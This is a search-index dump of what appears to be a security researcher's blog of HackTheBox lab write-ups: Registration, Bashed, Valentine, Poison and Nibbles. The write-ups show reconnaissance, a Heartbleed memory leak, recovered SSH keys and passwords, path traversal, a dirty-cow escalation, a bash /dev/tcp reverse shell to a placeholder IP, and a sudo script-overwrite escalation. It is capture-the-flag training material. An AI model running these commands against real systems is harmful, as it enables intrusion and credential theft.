{
    "docs": [
        {
            "location": "/", 
            "text": "Introduction\n\n\nHi there!\n\n\nI'm a person interested in information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.\n\n\nI wanted to share in some way the little things I do in my spare time, such as tools, CTF write ups, researches, etc.\nHope you enjoy it!\n\n\n@partu18", 
            "title": "Home"
        }, 
        {
            "location": "/#introduction", 
            "text": "Hi there!  I'm a person interested in information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.  I wanted to share in some way the little things I do in my spare time, such as tools, CTF write ups, researches, etc.\nHope you enjoy it!  @partu18", 
            "title": "Introduction"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/", 
            "text": "Registration\n\n\nIn order to join to the platform, you should solve the first challenge.\n\n\nOnce in the \nJOIN\n section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: \n/js/inviteapi.min.js\n. After openning and formating it:\n\n\n\neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={\n4\n:4};$.9({a:\n7\n,5:\n6\n,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\n7\n,5:\n6\n,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)\n\n\n\n\n\nSo basically, it's a JS functiont that it's being called with some specific parameters.\n\n\nIt's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy \n paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:\n\n\n\n\nThe answer gathered is again JS code:\n\n\n\nfunction verifyInviteCode(code){\n    var formData = {\ncode\n:code};\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\n\n\n\n\nThis time seems to show us how the \nInviteCode\n related functions are invoked... Time to use \nburp\n:\n\n\nIssuing the following POST we will receive an answer with some information encoded: \n\n\n\nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ndata\n:\nSW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\n,\nenctype\n:\nBASE64\n},\n0\n:200}\n\n\n\n\n\nAfter decoding the value inside \ndata\n which is encoded with the encoding mentioned in \nenctype\n, you'll get the a message saying:\n\nIn order to generate the invite code, make a POST request to /api/invite/generate\n\n\nSo, let folow their order:\n\n\n\nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ncode\n:\nWElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\n,\nformat\n:\nencoded\n},\n0\n:200}\n\n\n\n\n\nAnd here it is.. Our \ncode\n is encoded in base64. Once decoded you'll get your code:\n\n\nXIKAY-XYEZO-NJZLJ-USEAS-ZBALN\n (in my case).\n\n\nDisclaimer\n\n\nI did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Initial registration to HTB"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#registration", 
            "text": "In order to join to the platform, you should solve the first challenge.  Once in the  JOIN  section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script:  /js/inviteapi.min.js . After openning and formating it:  \neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={ 4 :4};$.9({a: 7 ,5: 6 ,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a: 7 ,5: 6 ,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)  So basically, it's a JS functiont that it's being called with some specific parameters.  It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy   paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:   The answer gathered is again JS code:  \nfunction verifyInviteCode(code){\n    var formData = { code :code};\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}  This time seems to show us how the  InviteCode  related functions are invoked... Time to use  burp :  Issuing the following POST we will receive an answer with some information encoded:   \nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ data : SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl , enctype : BASE64 }, 0 :200}  After decoding the value inside  data  which is encoded with the encoding mentioned in  enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate  So, let folow their order:  \nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ code : WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4= , format : encoded }, 0 :200}  And here it is.. Our  code  is encoded in base64. Once decoded you'll get your code:  XIKAY-XYEZO-NJZLJ-USEAS-ZBALN  (in my case).", 
            "title": "Registration"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#disclaimer", 
            "text": "I did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Disclaimer"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/", 
            "text": "Bashed\n\n\nUser\n\n\nThis machine was pretty easy.\nFirst of all I used \ndirb\n to start listing some common directories.\n\n\n\ndirb http://10.10.10.68 common.txt\n\n\n\n\n\nSome directories were found:\n\n\n\n\nThe \ndev\n seemed to be the most interesting one, therefore I started from there:\n\n\n\n\nAnd once inside \nphpbash.php\n:\n\n\n\n\nRoot\n\n\nTBD", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#bashed", 
            "text": "", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#user", 
            "text": "This machine was pretty easy.\nFirst of all I used  dirb  to start listing some common directories.  \ndirb http://10.10.10.68 common.txt  Some directories were found:   The  dev  seemed to be the most interesting one, therefore I started from there:   And once inside  phpbash.php :", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#root", 
            "text": "TBD", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/", 
            "text": "Valentine (User \n root)\n\n\nUser\n\n\nSo, in order to start, as always, I used \nnmap\n:\n\n\n\n\nSSH\n, \nHTTP\n, \nHTTPS\n. Let's navigate the web servers while we wait for \ndirb\n again.\n\n\nThe index of both webservers is an image of a woman like shouting and the logo of \nheartbleed\n:\n\n\n\n\nFrom last machine I learn that inside \n/dev/\n something could appear. Let's try...:\n\n\n\n\nWell, that was lucky. Inside the \nnotes.txt\n there isn't anything interesting, but inside \nhype_key\n, there is some \nencoded\n text. Seems to be printable hex, so let's try to decode it: \nhex to ascii\n\n\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----\n\n\n\n\n\nNice! We have a private key... but what for? Maybe to login by \nssh\n? We still need the passphrase for it... \nI was expecting that \ndirb\n helped me with the output, but .. unfortunately, it didn't helped me. There were some \nphp\n scrips that seemed to encode/decode base64, but nothing else (well, it has the \n/dev\n directory):\n\n\n\n\nThen, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used \nMetasploit\n because it already had a \nmodule\n to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:\n\n\n\n\n\n\nAfter analzing these samples, I found a very interesting thing. There was an HTTP request there:\n\n\n\n\nIt was using one the \n.php\n scripts that we found thanks to \ndirb\n, which was \ndecode.php\n.. Let's try to decode it:\n\n\n\n\nYEAH!\n seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?\n\n\nIn order to ensure it, I issued the following command\n\n\nssh-keygen -y -f rsa_key.pem\n\n\n\n\nwith \nrsa_key.pem\n being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase \nheartbleedbelievethehype\n the public key was successfully created.\n\n\nSo far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via \nSSH\n. But still, we don't know the user. I spent a \nLOOOONGG\n time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that \nvalentine\n had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...\n\n\nI spent lot of time trying to find the correct user:\n\n\n\n\nLooking on new samples of memory gathered by exploiting heartbleed.\n\n\nLooking in the page source code of the pages hosted in the HTTP Server.\n\n\nTrying with common users (guest, www-data, etc).\n\n\nAmong others.\n\n\n\n\nFinally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called \nhype_key\n. So I literally ran to type the following command, which \nfortunately\n gave me access to the machine.\n\n\nssh -v -i rsa_key.pem hype@10.10.10.79\n\n\n\n\nOnce inside, it was just needed to go to the home directory of this user, and find the \nuser.txt\n file with the hash inside.\n\n\nRoot\n\n\nI copied the \nLinEnum.sh\n file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:\n\n\nuname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n\n\n\n\nSo yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on \nperf_swevent_init\n and other two related to \ndity cow\n. Unfortunately, there didn't work (don't know why, specially the latest).\n\n\nFinally, I found some \nvideo\n explaining how to use a variant of \ndirty cow\n to modify the \n/etc/passwd/\n file in order to create a new user with id 0 (root privileges). \nExploit\n\n\nThe exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Valentine"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#valentine-user-root", 
            "text": "", 
            "title": "Valentine (User &amp; root)"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#user", 
            "text": "So, in order to start, as always, I used  nmap :   SSH ,  HTTP ,  HTTPS . Let's navigate the web servers while we wait for  dirb  again.  The index of both webservers is an image of a woman like shouting and the logo of  heartbleed :   From last machine I learn that inside  /dev/  something could appear. Let's try...:   Well, that was lucky. Inside the  notes.txt  there isn't anything interesting, but inside  hype_key , there is some  encoded  text. Seems to be printable hex, so let's try to decode it:  hex to ascii  -----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----  Nice! We have a private key... but what for? Maybe to login by  ssh ? We still need the passphrase for it... \nI was expecting that  dirb  helped me with the output, but .. unfortunately, it didn't helped me. There were some  php  scrips that seemed to encode/decode base64, but nothing else (well, it has the  /dev  directory):   Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used  Metasploit  because it already had a  module  to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:    After analzing these samples, I found a very interesting thing. There was an HTTP request there:   It was using one the  .php  scripts that we found thanks to  dirb , which was  decode.php .. Let's try to decode it:   YEAH!  seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?  In order to ensure it, I issued the following command  ssh-keygen -y -f rsa_key.pem  with  rsa_key.pem  being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase  heartbleedbelievethehype  the public key was successfully created.  So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via  SSH . But still, we don't know the user. I spent a  LOOOONGG  time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that  valentine  had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...  I spent lot of time trying to find the correct user:   Looking on new samples of memory gathered by exploiting heartbleed.  Looking in the page source code of the pages hosted in the HTTP Server.  Trying with common users (guest, www-data, etc).  Among others.   Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called  hype_key . So I literally ran to type the following command, which  fortunately  gave me access to the machine.  ssh -v -i rsa_key.pem hype@10.10.10.79  Once inside, it was just needed to go to the home directory of this user, and find the  user.txt  file with the hash inside.", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#root", 
            "text": "I copied the  LinEnum.sh  file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:  uname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux  So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on  perf_swevent_init  and other two related to  dity cow . Unfortunately, there didn't work (don't know why, specially the latest).  Finally, I found some  video  explaining how to use a variant of  dirty cow  to modify the  /etc/passwd/  file in order to create a new user with id 0 (root privileges).  Exploit  The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/", 
            "text": "Poison\n\n\nUser\n\n\nSo, started with the usual nmap command: \n\n\n\nWe have a lot of things to attack. Let's start with the http. \n\n\nFirst page ask you to choose one script.. Let's took \nlistfiles.php\n...\n\n\n\n\n\n\nThe answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called \npwdbackup.txt\n. I'd like to read it.. so.. what happens if we change the file param of the url? \n\n\n\n\nGreat... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:\n\n\nimport base64 \n\npassword = \nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\n\n\nfor _ in xrange(13):\n    password = base64.decodestring(password)\n\nprint password\n\n\n\n\nOnce executed.. the answer is: \nCharix!2#4%6\n8(0\n.\nOk maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. \nWhat if we use again the path traversal vuln?:\n\n\n\n\nPerfect. There is a user called \ncharix\n, due to the password has also that string, I guess is the correct user for our password.\nLet's try an ssh connection: \n\n\n\n\nRoot\n\n\nOk, once I started using \nLinEnum.sh\n, looking for filesystem files, doing enumeration basically. The first thing, is the \nsecret.zip\n file which is placed in the home of charix. \n\n\nI copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. \n\n\nThen, I continued enumerating and discovered some processes running as root listeining only in localhost: \n\n\n\n\nIn particular, \nXvnc\n and \nsendmail\n sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. \n\n\nSo I looked for some commands in the machine (just pressing vnc\n) and found \nvncpasswd\n. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:\n\n\n\n\nSo, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. \nSo then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was \none\n.\n\n\nAfter using it, get the password \nVNCP@$$!\n.\n\n\nThis probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.\n\n\nAt this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:\n\n\nssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84\n\n\n\n\nOnce I made that connection, using remmina, the root user and the password found, I was able to get the flag: \n\n\n\n\n\nYEAH! I had to copy it char by char xD.\n\n\nNibbles (User \n Rooted)\n\n\nUser\n\n\nReading comments. Found\n\n\n!-- /nibbleblog/ directory. Nothing interesting here! --\n\n\n\n\n\nRan dirbuster against http://10.10.10.75/nibbleblog/ \nFound \nadmin.php\n.\n\n\nTried with some default credentials:\n\n\n\n\nadmin:admin\n\n\nnibbles:nibbles\n\n\nadmin:nibbles \n(GOT IT!)\n\n\n\n\nTried to look for a LFI in some upload of images (new page, new post) without luck..\n\n\nSearch in google for nibbleblog: \nIt is a well-known CMS!\n.. Looking for exploit: YEAH! INside \nMSF\n.\n\n\nRun the exploit:\n\n\n\n\nOnce with the meterpreter.\n\n\ncat /etc/passsd\n\n\n\n\nShowed me, that there was only one user interesting called \nnibbler\n.\n\n\nwhoami\n\n\n\n\nreturned also \nnibbler\n.\n\n\nWent to /home/nibbler and...:\n\n\n\nRoot\n\n\nSo, first step was to create a reverse shell.. In order to do that I did:\n\n\n On my local machine \n\n\nsudo ufw allow 3333\nnc -lnvp 3333\n\n\n\n\n On the remote machine\n\n\nbash -i\nbash -i \n /dev/tcp/IP/3333 0\n1\n\n\n\n\n\n\nOnce I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this \nvideo\n).\n\n\nSo next step was use the \nLinEnum.sh\n. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).\n\n\nOnce I ran it, one of the outputs was:\n\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n\n[+] Possible sudo pwnage!\n-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nThis basicall means that there is a misconfiguration in the \n/etc/sudoers\n file which allows the user \nnibbler\n to execute any \nmonitor.sh\n as root, without prompting any password. So my next step was simply:\n\n\necho \ncat /root/root.txt\n \n /home/nibbler/personal/stuff/monitor.sh\nsudo /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nIt's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works\n\n\nThe output was the flag =):", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#poison", 
            "text": "", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#user", 
